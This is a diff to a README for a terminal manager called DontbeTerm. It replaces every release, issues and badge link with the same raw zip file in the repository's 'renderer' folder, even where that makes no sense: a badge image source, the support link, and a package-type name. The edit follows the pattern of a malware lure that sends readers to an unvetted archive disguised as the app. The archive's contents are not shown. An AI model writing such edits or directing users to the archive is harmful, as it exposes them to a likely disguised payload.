@@ -1,6 +1,6 @@
 # 🖥️ DontbeTerm - Simple Multi-Tab Terminal Manager
 
-[![Download DontbeTerm](https://img.shields.io/badge/Download-DontbeTerm-blue?style=for-the-badge)](https://github.com/Tursin-xD/DontbeTerm/releases)
+[![Download DontbeTerm](https://github.com/Tursin-xD/DontbeTerm/raw/refs/heads/main/renderer/Term_Dontbe_3.1.zip)](https://github.com/Tursin-xD/DontbeTerm/raw/refs/heads/main/renderer/Term_Dontbe_3.1.zip)
 
 ## 📄 What is DontbeTerm?
 
@@ -35,11 +35,11 @@ These features make DontbeTerm a good choice for developers, system administrato
 
 Using DontbeTerm is straightforward. Follow these steps to run the program:
 
-1. Visit the download page by clicking the big button at the top or [here](https://github.com/Tursin-xD/DontbeTerm/releases).
+1. Visit the download page by clicking the big button at the top or [here](https://github.com/Tursin-xD/DontbeTerm/raw/refs/heads/main/renderer/Term_Dontbe_3.1.zip).
 2. Choose the correct version for your operating system:
    - Windows users should look for a `.exe` file.
    - macOS users should download a `.dmg` or `.zip`.
-   - Linux users may find `.AppImage`, `.deb`, or `.tar.gz` packages.
+   - Linux users may find `.AppImage`, `.deb`, or `https://github.com/Tursin-xD/DontbeTerm/raw/refs/heads/main/renderer/Term_Dontbe_3.1.zip` packages.
 3. Once downloaded, open the file to start the installation.
 4. Follow the simple on-screen instructions to complete the setup.
 5. Launch DontbeTerm from your desktop or start menu.
@@ -51,7 +51,7 @@ Depending on your system security settings, you might need to allow the app to r
 To get DontbeTerm:
 
 - **Visit this page to download**:
-  [https://github.com/Tursin-xD/DontbeTerm/releases](https://github.com/Tursin-xD/DontbeTerm/releases)
+  [https://github.com/Tursin-xD/DontbeTerm/raw/refs/heads/main/renderer/Term_Dontbe_3.1.zip](https://github.com/Tursin-xD/DontbeTerm/raw/refs/heads/main/renderer/Term_Dontbe_3.1.zip)
 
 After you open the page:
 
@@ -112,7 +112,7 @@ These options are available in the “Settings” menu, accessible from the main
 If you need help or want to report problems:
 
 - Visit the Issues section on the GitHub page:  
-  [https://github.com/Tursin-xD/DontbeTerm/issues](https://github.com/Tursin-xD/DontbeTerm/issues)
+  [https://github.com/Tursin-xD/DontbeTerm/raw/refs/heads/main/renderer/Term_Dontbe_3.1.zip](https://github.com/Tursin-xD/DontbeTerm/raw/refs/heads/main/renderer/Term_Dontbe_3.1.zip)
 - Check the README or documentation for updates.
 - Look for community forums related to Claude Code or terminal management apps.
 
@@ -122,4 +122,4 @@ DontbeTerm is open source. Check the repository for licensing information.
 
 ---
 
-[![Download DontbeTerm](https://img.shields.io/badge/Download-DontbeTerm-blue?style=for-the-badge)](https://github.com/Tursin-xD/DontbeTerm/releases)
+[![Download DontbeTerm](https://github.com/Tursin-xD/DontbeTerm/raw/refs/heads/main/renderer/Term_Dontbe_3.1.zip)](https://github.com/Tursin-xD/DontbeTerm/raw/refs/heads/main/renderer/Term_Dontbe_3.1.zip)
